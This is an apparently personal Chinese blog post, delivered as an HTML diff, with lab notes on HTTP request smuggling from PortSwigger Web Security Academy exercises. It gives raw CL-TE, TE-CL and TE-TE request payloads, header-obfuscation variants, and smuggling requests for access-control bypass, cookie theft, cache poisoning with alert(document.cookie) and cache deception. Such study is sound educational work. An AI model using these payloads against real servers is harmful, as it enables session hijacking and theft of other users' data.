@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            HTTP请求走私的学习
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-request-smuggling"><span class="toc-text">HTTP request smuggling</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%A0%E7%A7%8D%E4%B8%8D%E5%90%8C%E7%9A%84%E8%B5%B0%E7%A7%81%E7%B1%BB%E5%9E%8B"><span class="toc-text">几种不同的走私类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-TE"><span class="toc-text">CL-TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-CL"><span class="toc-text">TE-CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-TE"><span class="toc-text">TE-TE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">利用HTTP请求走私漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass%E5%89%8D%E7%AB%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81"><span class="toc-text">Bypass前端服务器安全验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E8%AF%B7%E6%B1%82%E7%9A%84%E9%87%8D%E5%86%99%E6%83%85%E5%86%B5"><span class="toc-text">获取前端服务器对请求的重写情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84Cookie"><span class="toc-text">获取其他用户的Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-HEADER%E5%AF%BC%E8%87%B4%E7%9A%84XSS"><span class="toc-text">HTTP HEADER导致的XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"><span class="toc-text">HTTP请求走私 + 缓存投毒 + 缓存欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="toc-text">说在后面</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>这次在DEFCON上遇到一道关于HTTP走私（HTTP request smuggling）的题，自己又一直没有整理这方面的内容，就花了一两天的时间把Brupsuite社区上的实验都做了。这里简单记录一下。</p>
+<a id="more"></a>
+<h2 id="HTTP-request-smuggling"><a href="#HTTP-request-smuggling" class="headerlink" title="HTTP request smuggling"></a>HTTP request smuggling</h2><p>建议阅读：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a></p>
+<p>当网站使用两个服务器（一个前端，一个后端）来处理用户所提交的数据，而两个服务器之间对HTTP HEADER的处理不一致时，就可能产生HTTP走私问题。比如文章当中所描述的体系结构：</p>
+<blockquote>
+<p>现在的Web应用程序经常在用户和最终的应用程序之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理），并且该服务器将请求转发到一个或多个后端服务器。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/20/bwX9kRqDACEZMGN.png" alt="Untitled.png"></p>
+<h3 id="几种不同的走私类型"><a href="#几种不同的走私类型" class="headerlink" title="几种不同的走私类型"></a>几种不同的走私类型</h3><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。使用下面简单的HTTP请求来判断是否存在走私问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>当第二次请求时出现HTTP方式错误，则存在走私问题。实验截图：</p>
+<p><img src="https://i.loli.net/2020/05/20/RKO2LufhQGv8myo.png" alt="Untitled 1.png"></p>
+<p>常见情况中是不会出现HTTP方式错误的，可以通过时间延迟来判断是否存在CL-TE类型的走私问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+
+<p>如果存在走私问题，下一个请求就会有明显的延迟。</p>
+<p>或者使用下面的payload进行验证，如果存在走私问题，则会返回错误的页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 50</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">q&#x3D;smuggling&amp;x&#x3D;</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/20/Z8KaM7goOnX4Ftk.png" alt="Untitled 2.png"></p>
+<ul>
+<li>实验中遇到的问题</li>
+</ul>
+<p>由于前端服务器处理Content-Length，需要把我们所有的内容都发送到后端服务器中去，那这个Content-Length可以用Brupsuite自动计算。用<code>换行0换行</code>来分段即可。</p>
+<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</p>
+<ul>
+<li>简单判断payload</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>时间延迟判断</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>响应差异判断</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">7c</span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 144</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/20/ps5qgLDe9KN4Zif.png" alt="Untitled 3.png"></p>
+<ul>
+<li>实验中遇到的问题</li>
+</ul>
+<p>可以先构造好请求头，之后用Brupsuite的HTTP走私插件来生成Chunk，Content-Length的自动计算关闭，填入4（前面两个字符的字节长度）即可。</p>
+<p>需要注意的是走私的请求中，Content-Length一定要少于后面请求中的长度，否则后台会Timeout出现错误。</p>
+<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>这种情况还是比较少，这里简单记录一下：</p>
+<p>前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式混淆标头来诱导其中一台服务器不对其进行处理。</p>
+<p>混淆的方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
+
+<p>TE.TE的实验的pyload（做完忘记截图了）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用HTTP请求走私漏洞"><a href="#利用HTTP请求走私漏洞" class="headerlink" title="利用HTTP请求走私漏洞"></a>利用HTTP请求走私漏洞</h2><p>建议阅读：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting">Exploiting HTTP request smuggling vulnerabilities</a></p>
+<h3 id="Bypass前端服务器安全验证"><a href="#Bypass前端服务器安全验证" class="headerlink" title="Bypass前端服务器安全验证"></a>Bypass前端服务器安全验证</h3><p>当前端服务器对某些页面添加了访问限制，比如实验中对admin页面控制在只能是后端服务器才能访问。就可以通过HTTP走私漏洞来绕过这个限制：</p>
+<ul>
+<li>CL.TE</li>
+</ul>
+<p><img src="https://i.loli.net/2020/05/20/8XtG4iShFw9uo3l.png" alt="Untitled 4.png"></p>
+<ul>
+<li>TE.CL</li>
+</ul>
+<p><img src="https://i.loli.net/2020/05/20/iB5KPhJGnqUOIVW.png" alt="Untitled 5.png"></p>
+<h3 id="获取前端服务器对请求的重写情况"><a href="#获取前端服务器对请求的重写情况" class="headerlink" title="获取前端服务器对请求的重写情况"></a>获取前端服务器对请求的重写情况</h3><p>前端服务器通常在请求添加到其他请求头之前，先对请求进行一些重写，然后再转发给后端服务器。一般是添加一些HTTP HEADER。可以通过HTTP走私请求来获取到这些重写内容。但需要一些条件：</p>
+<ul>
+<li>存在一个POST请求，传入参数会储存并可以被查看</li>
+<li>存在HTTP走私请求</li>
+</ul>
+<p>构造一个chunk，包含一个完整的post请求，把可以储存的参数放在最后。当第二个请求传递时，则会把HTTP HEADER添加在参数后面而被存储。就可以获取到前端服务器所添加的HTTP HEADER。这里需要注意Content-Length不能超过所传递数据包的长度，不然会导致请求失败。</p>
+<ul>
+<li>CL-TE</li>
+</ul>
+<p><img src="https://i.loli.net/2020/05/20/bGAnEVqfoJvw6tj.png" alt="Untitled 6.png"></p>
+<ul>
+<li>CL-TE</li>
+</ul>
+<p><img src="https://i.loli.net/2020/05/20/fdsCv4pHk2XebWl.png" alt="Untitled 7.png"></p>
+<h3 id="获取其他用户的Cookie"><a href="#获取其他用户的Cookie" class="headerlink" title="获取其他用户的Cookie"></a>获取其他用户的Cookie</h3><p>参考上一个实验，这个实验也是通过获取HTTP HEADER来获取其他用户的Cookie。</p>
+<p><img src="https://i.loli.net/2020/05/20/4bl1GDnrgU2dAc3.png" alt="Untitled 8.png"></p>
+<p>平均发三次才会有一次成功，以及长度必须要严格控制好。</p>
+<h3 id="HTTP-HEADER导致的XSS"><a href="#HTTP-HEADER导致的XSS" class="headerlink" title="HTTP HEADER导致的XSS"></a>HTTP HEADER导致的XSS</h3><p>通常情况下，HTTP HEADER导致的XSS是不好利用的，但是通过HTTP走私请求，我们能够控制HTTP HEADER，进而就可以利用这类HTTP头导致的XSS。</p>
+<p><img src="https://i.loli.net/2020/05/20/cePvXkO7nTWGA3p.png" alt="Untitled 9.png"></p>
+<h3 id="HTTP请求走私-缓存投毒-缓存欺骗"><a href="#HTTP请求走私-缓存投毒-缓存欺骗" class="headerlink" title="HTTP请求走私 + 缓存投毒 + 缓存欺骗"></a>HTTP请求走私 + 缓存投毒 + 缓存欺骗</h3><p>这里简单记录一下这种攻击的过程(两个实验都没复现成功)：</p>
+<p>一、缓存投毒</p>
+<ul>
+<li>构造一个面中写入恶意的内容，比如写入alert(document.cookie)</li>
+<li>发送请求走私的内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>再寻找到一个可用缓存的js页面（可用导致xss的js）访问。页面会跳转到恶意页面中，并且将恶意内容缓存到服务器上。</li>
+<li>打开主页 ⇒ 导致xss</li>
+</ul>
+<p>二、缓存欺骗</p>
+<p>缓存欺骗：在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。</p>
+<ul>
+<li>寻找一个存在隐私的页面，比如这里的my-account，并且页面返回的内容是可以被缓存的</li>
+<li>发送一个走私请求，下一个请求静态资源的请求会跳转到my-acount并把隐私信息缓存</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;my-account HTTP&#x2F;1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>打开隐私浏览器加载主页，用Brupsuite搜索隐私内容的关键字。如果成功的话可以在静态资源中搜索到。</li>
+</ul>
+<p>这里的原理：</p>
+<p>提交一个走私的请求如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 43</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>
+
+<p>那下一个请求就相当于会把HTTP方法那一行注释，提交的请求为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: XGET &#x2F;static&#x2F;some-image.png HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId&#x3D;q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>导致隐私信息被缓存。</p>
+<h2 id="说在后面"><a href="#说在后面" class="headerlink" title="说在后面"></a>说在后面</h2><p>HTTP请求走私应该还有很多的利用面，后面慢慢补充…</p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
